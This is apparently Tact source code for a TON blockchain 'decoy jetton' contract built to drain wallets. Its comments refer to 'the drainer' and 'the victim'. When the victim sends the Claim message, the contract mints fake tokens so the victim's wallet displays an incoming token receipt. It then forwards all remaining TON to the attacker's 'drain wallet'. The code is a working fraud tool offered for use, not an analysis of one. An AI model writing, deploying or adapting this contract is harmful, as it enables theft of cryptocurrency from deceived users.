// Self-contained TEP-74-ish jetton. No @stdlib/jetton import.

struct JettonData {
    totalSupply: Int as coins;
    mintable: Bool;
    adminAddress: Address;
    jettonContent: Cell;
    jettonWalletCode: Cell;
}

struct WalletData {
    balance: Int as coins;
    owner: Address;
    jetton: Address;
    jettonWalletCode: Cell;
}

// from the drainer: op(32)=0xabcdef13 | queryId(64) | amount(coins) | receiver(Address) | ref(comment)
message(0xabcdef13) Claim {
    queryId: Int as uint64;
    amount: Int as coins;
    receiver: Address;
    comment: Cell;
}

// internal mint, master -> jetton wallet
message(0x178d4519) TokenTransferInternal {
    queryId: Int as uint64;
    amount: Int as coins;
    from: Address;
    responseDestination: Address;
    forwardTonAmount: Int as coins;
    forwardPayload: Slice as remaining;
}

message(0xd53276db) TokenExcesses {
    queryId: Int as uint64;
}

// TEP-74 notification, owner <- wallet. Wallets decode this as "received".
message(0x7362d09c) TokenTransferNotification {
    queryId: Int as uint64;
    amount: Int as coins;
    from: Address;
    forwardPayload: Slice as remaining;
}

// the ONLY place that touches .address
fun decoyWalletAddress(who: Address): Address {
    return contractAddress(initOf DecoyJettonWallet(who, myAddress()));
}

contract DecoyJetton {
    totalSupply: Int as coins;
    owner: Address;
    content: Cell;

    init(owner: Address, content: Cell) {
        self.totalSupply = 0;
        self.owner = owner;
        self.content = content;
    }

    // accepts the bare deploy message
    receive() {}

    // the victim's message
    receive(msg: Claim) {
        let who: Address = sender();
        self.totalSupply = self.totalSupply + msg.amount;

        // 1) mint to the sender -> their wallet shows "Receive N SYMBOL"
        send(SendParameters{
            to: decoyWalletAddress(who),
            value: 50000000, // 0.05 TON to fund the mint
            mode: SendIgnoreErrors,
            bounce: false,
            body: TokenTransferInternal{
                queryId: 0,
                amount: msg.amount,
                from: myAddress(),
                responseDestination: myAddress(),
                forwardTonAmount: 0,
                forwardPayload: emptyCell().asSlice()
            }.toCell(),
            code: initOf DecoyJettonWallet(who, myAddress()).code,
            data: initOf DecoyJettonWallet(who, myAddress()).data
        });

        // 2) forward everything left to your drain wallet, comment intact
        send(SendParameters{
            to: msg.receiver,
            value: 0,
            mode: SendRemainingValue + SendIgnoreErrors,
            bounce: false,
            body: msg.comment
        });
    }

    get fun get_jetton_data(): JettonData {
        return JettonData{
            totalSupply: self.totalSupply,
            mintable: true,
            adminAddress: self.owner,
            jettonContent: self.content,
            jettonWalletCode: initOf DecoyJettonWallet(self.owner, myAddress()).code
        };
    }

    get fun get_wallet_address(ownerAddress: Address): Address {
        return decoyWalletAddress(ownerAddress);
    }
}

contract DecoyJettonWallet {
    balance: Int as coins = 0;
    owner: Address;
    jetton: Address;

    init(owner: Address, jetton: Address) {
        self.owner = owner;
        self.jetton = jetton;
    }

    receive() {}

    receive(msg: TokenTransferInternal) {
        require(sender() == self.jetton, "not the jetton master");
        self.balance = self.balance + msg.amount;
        send(SendParameters{
            to: self.owner,
            value: 0,
            mode: SendRemainingValue + SendIgnoreErrors,
            bounce: false,
            body: TokenTransferNotification{
                queryId: msg.queryId,
                amount: msg.amount,
                from: self.jetton,
                forwardPayload: emptyCell().asSlice()
            }.toCell()
        });
    }

    get fun get_wallet_data(): WalletData {
        return WalletData{
            balance: self.balance,
            owner: self.owner,
            jetton: self.jetton,
            jettonWalletCode: initOf DecoyJettonWallet(self.owner, self.jetton).code
        };
    }
}
